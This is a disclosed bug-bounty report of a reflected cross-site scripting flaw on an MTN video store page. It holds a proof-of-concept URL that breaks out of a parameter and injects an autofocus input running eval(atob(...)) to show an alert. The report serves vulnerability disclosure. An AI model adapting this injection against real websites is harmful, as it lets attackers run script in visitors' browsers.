# XSS at videostore.mtnonline.com/GL/*.aspx via all parameters

## Report Details
- **Report ID**: 1244731
- **URL**: https://hackerone.com/reports/1244731
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-26T00:02:26.096Z
- **Disclosed**: 2022-05-01T21:20:58.456Z

## Reporter
- **Username**: homosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
PoC
```
https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27><input%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus>
```

Symbols <"/'> are not filtered that alloweds to inject HTML code.
{F1353609}

## Impact

XSS at videostore.mtnonline.com

## Attachments
- mtn.xss.3.png
